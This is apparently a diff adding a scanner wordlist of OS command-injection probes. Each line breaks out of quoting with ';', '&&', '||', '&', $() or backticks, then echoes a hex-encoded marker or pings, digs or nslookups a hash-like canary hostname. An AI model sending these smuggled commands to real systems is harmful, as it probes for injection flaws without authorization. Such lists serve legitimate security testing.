+"; echo -e "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38"; "
+"; echo -e "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38"; "
+'; echo -e "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38"; '
+'; echo -e "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38"; '
+"; echo -e "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38" 2>&1; "
+"; echo -e "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38" 2>&1; "
+'; echo -e "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38" 2>&1; '
+'; echo -e "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38" 2>&1; '
+echo -e "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38"
+echo -e "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38"
+bash -c "$@" x eval echo -e "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38";
+bash -c "$@" x eval echo -e "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38";
+; printf "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38"; 
+; printf "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38"; 
+; printf "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38" 2>&1; 
+; printf "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38" 2>&1; 
+ && false || printf "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38" && 
+ && false || printf "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38" && 
+ && false || printf "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38" 2>&1 && 
+ && false || printf "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38" 2>&1 && 
+"; printf "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38"; "
+"; printf "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38"; "
+'; printf "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38"; '
+'; printf "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38"; '
+"; printf "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38" 2>&1; "
+"; printf "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38" 2>&1; "
+'; printf "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38" 2>&1; '
+'; printf "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38" 2>&1; '
+printf "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38"
+printf "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38"
+bash -c "$@" x eval printf "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38";
+bash -c "$@" x eval printf "\\x65\\x37\\x61\\x34\\x38\\x38\\x37\\x36\\x31\\x35\\x31\\x33\\x61\\x65\\x37\\x65\\x63\\x32\\x31\\x65\\x37\\x32\\x34\\x62\\x62\\x66\\x39\\x65\\x34\\x64\\x34\\x38\\x66\\x33\\x39\\x30\\x34\\x38\\x39\\x65\\x33\\x66\\x61\\x39\\x38\\x39\\x63\\x33\\x39\\x66\\x61\\x33\\x37\\x30\\x63\\x34\\x39\\x30\\x63\\x64\\x62\\x64\\x37\\x38";
+; printf \e\7\a\4\8\8\7\6\1\5\1\3\a\e\7\e\c\2\1\e\7\2\4\b\b\f\9\e\4\d\4\8\f\3\9\0\4\8\9\e\3\f\a\9\8\9\c\3\9\f\a\3\7\0\c\4\9\0\c\d\b\d\7\8; 
+; printf \e\7\a\4\8\8\7\6\1\5\1\3\a\e\7\e\c\2\1\e\7\2\4\b\b\f\9\e\4\d\4\8\f\3\9\0\4\8\9\e\3\f\a\9\8\9\c\3\9\f\a\3\7\0\c\4\9\0\c\d\b\d\7\8; 
+; printf \e\7\a\4\8\8\7\6\1\5\1\3\a\e\7\e\c\2\1\e\7\2\4\b\b\f\9\e\4\d\4\8\f\3\9\0\4\8\9\e\3\f\a\9\8\9\c\3\9\f\a\3\7\0\c\4\9\0\c\d\b\d\7\8 2>&1; 
+; printf \e\7\a\4\8\8\7\6\1\5\1\3\a\e\7\e\c\2\1\e\7\2\4\b\b\f\9\e\4\d\4\8\f\3\9\0\4\8\9\e\3\f\a\9\8\9\c\3\9\f\a\3\7\0\c\4\9\0\c\d\b\d\7\8 2>&1; 
+ && false || printf \e\7\a\4\8\8\7\6\1\5\1\3\a\e\7\e\c\2\1\e\7\2\4\b\b\f\9\e\4\d\4\8\f\3\9\0\4\8\9\e\3\f\a\9\8\9\c\3\9\f\a\3\7\0\c\4\9\0\c\d\b\d\7\8 && 
+ && false || printf \e\7\a\4\8\8\7\6\1\5\1\3\a\e\7\e\c\2\1\e\7\2\4\b\b\f\9\e\4\d\4\8\f\3\9\0\4\8\9\e\3\f\a\9\8\9\c\3\9\f\a\3\7\0\c\4\9\0\c\d\b\d\7\8 && 
+ && false || printf \e\7\a\4\8\8\7\6\1\5\1\3\a\e\7\e\c\2\1\e\7\2\4\b\b\f\9\e\4\d\4\8\f\3\9\0\4\8\9\e\3\f\a\9\8\9\c\3\9\f\a\3\7\0\c\4\9\0\c\d\b\d\7\8 2>&1 && 
+ && false || printf \e\7\a\4\8\8\7\6\1\5\1\3\a\e\7\e\c\2\1\e\7\2\4\b\b\f\9\e\4\d\4\8\f\3\9\0\4\8\9\e\3\f\a\9\8\9\c\3\9\f\a\3\7\0\c\4\9\0\c\d\b\d\7\8 2>&1 && 
+"; printf \e\7\a\4\8\8\7\6\1\5\1\3\a\e\7\e\c\2\1\e\7\2\4\b\b\f\9\e\4\d\4\8\f\3\9\0\4\8\9\e\3\f\a\9\8\9\c\3\9\f\a\3\7\0\c\4\9\0\c\d\b\d\7\8; "
+"; printf \e\7\a\4\8\8\7\6\1\5\1\3\a\e\7\e\c\2\1\e\7\2\4\b\b\f\9\e\4\d\4\8\f\3\9\0\4\8\9\e\3\f\a\9\8\9\c\3\9\f\a\3\7\0\c\4\9\0\c\d\b\d\7\8; "
+'; printf \e\7\a\4\8\8\7\6\1\5\1\3\a\e\7\e\c\2\1\e\7\2\4\b\b\f\9\e\4\d\4\8\f\3\9\0\4\8\9\e\3\f\a\9\8\9\c\3\9\f\a\3\7\0\c\4\9\0\c\d\b\d\7\8; '
+'; printf \e\7\a\4\8\8\7\6\1\5\1\3\a\e\7\e\c\2\1\e\7\2\4\b\b\f\9\e\4\d\4\8\f\3\9\0\4\8\9\e\3\f\a\9\8\9\c\3\9\f\a\3\7\0\c\4\9\0\c\d\b\d\7\8; '
+"; printf \e\7\a\4\8\8\7\6\1\5\1\3\a\e\7\e\c\2\1\e\7\2\4\b\b\f\9\e\4\d\4\8\f\3\9\0\4\8\9\e\3\f\a\9\8\9\c\3\9\f\a\3\7\0\c\4\9\0\c\d\b\d\7\8 2>&1; "
+"; printf \e\7\a\4\8\8\7\6\1\5\1\3\a\e\7\e\c\2\1\e\7\2\4\b\b\f\9\e\4\d\4\8\f\3\9\0\4\8\9\e\3\f\a\9\8\9\c\3\9\f\a\3\7\0\c\4\9\0\c\d\b\d\7\8 2>&1; "
+'; printf \e\7\a\4\8\8\7\6\1\5\1\3\a\e\7\e\c\2\1\e\7\2\4\b\b\f\9\e\4\d\4\8\f\3\9\0\4\8\9\e\3\f\a\9\8\9\c\3\9\f\a\3\7\0\c\4\9\0\c\d\b\d\7\8 2>&1; '
+'; printf \e\7\a\4\8\8\7\6\1\5\1\3\a\e\7\e\c\2\1\e\7\2\4\b\b\f\9\e\4\d\4\8\f\3\9\0\4\8\9\e\3\f\a\9\8\9\c\3\9\f\a\3\7\0\c\4\9\0\c\d\b\d\7\8 2>&1; '
+printf \e\7\a\4\8\8\7\6\1\5\1\3\a\e\7\e\c\2\1\e\7\2\4\b\b\f\9\e\4\d\4\8\f\3\9\0\4\8\9\e\3\f\a\9\8\9\c\3\9\f\a\3\7\0\c\4\9\0\c\d\b\d\7\8
+printf \e\7\a\4\8\8\7\6\1\5\1\3\a\e\7\e\c\2\1\e\7\2\4\b\b\f\9\e\4\d\4\8\f\3\9\0\4\8\9\e\3\f\a\9\8\9\c\3\9\f\a\3\7\0\c\4\9\0\c\d\b\d\7\8
+bash -c "$@" x eval printf \e\7\a\4\8\8\7\6\1\5\1\3\a\e\7\e\c\2\1\e\7\2\4\b\b\f\9\e\4\d\4\8\f\3\9\0\4\8\9\e\3\f\a\9\8\9\c\3\9\f\a\3\7\0\c\4\9\0\c\d\b\d\7\8;
+bash -c "$@" x eval printf \e\7\a\4\8\8\7\6\1\5\1\3\a\e\7\e\c\2\1\e\7\2\4\b\b\f\9\e\4\d\4\8\f\3\9\0\4\8\9\e\3\f\a\9\8\9\c\3\9\f\a\3\7\0\c\4\9\0\c\d\b\d\7\8;
+ & echo ^e^7^a^4^8^8^7^6^1^5^1^3^a^e^7^e^c^2^1^e^7^2^4^b^b^f^9^e^4^d^4^8^f^3^9^0^4^8^9^e^3^f^a^9^8^9^c^3^9^f^a^3^7^0^c^4^9^0^c^d^b^d^7^8 & 
+ & echo ^e^7^a^4^8^8^7^6^1^5^1^3^a^e^7^e^c^2^1^e^7^2^4^b^b^f^9^e^4^d^4^8^f^3^9^0^4^8^9^e^3^f^a^9^8^9^c^3^9^f^a^3^7^0^c^4^9^0^c^d^b^d^7^8 & 
+; ping -c 1 e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78; 
+; ping -c 1 e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78; 
+; ping -c 1 e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1; 
+; ping -c 1 e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1; 
+ && false || ping -c 1 e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 && 
+ && false || ping -c 1 e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 && 
+ && false || ping -c 1 e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1 && 
+ && false || ping -c 1 e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1 && 
+"; ping -c 1 e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78; "
+"; ping -c 1 e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78; "
+'; ping -c 1 e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78; '
+'; ping -c 1 e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78; '
+"; ping -c 1 e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1; "
+"; ping -c 1 e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1; "
+'; ping -c 1 e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1; '
+'; ping -c 1 e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1; '
+ping -c 1 e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78
+ping -c 1 e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78
+bash -c "$@" x eval ping -c 1 e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78;
+bash -c "$@" x eval ping -c 1 e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78;
+$(ping -c 1 e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78)
+$(ping -c 1 e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78)
+`ping -c 1 e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78`
+`ping -c 1 e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78`
+; dig e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78; 
+; dig e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78; 
+; dig e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1; 
+; dig e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1; 
+ && false || dig e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 && 
+ && false || dig e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 && 
+ && false || dig e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1 && 
+ && false || dig e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1 && 
+"; dig e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78; "
+"; dig e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78; "
+'; dig e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78; '
+'; dig e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78; '
+"; dig e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1; "
+"; dig e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1; "
+'; dig e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1; '
+'; dig e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1; '
+dig e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78
+dig e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78
+bash -c "$@" x eval dig e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78;
+bash -c "$@" x eval dig e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78;
+$(dig e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78)
+$(dig e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78)
+`dig e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78`
+`dig e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78`
+; nslookup e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78; 
+; nslookup e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78; 
+; nslookup e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1; 
+; nslookup e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1; 
+ && false || nslookup e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 && 
+ && false || nslookup e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 && 
+ && false || nslookup e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1 && 
+ && false || nslookup e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1 && 
+"; nslookup e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78; "
+"; nslookup e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78; "
+'; nslookup e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78; '
+'; nslookup e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78; '
+"; nslookup e7a488761513ae7ec21e724bbf9e4d48f390489e3fa989c39fa370c490cdbd78 2>&1; "
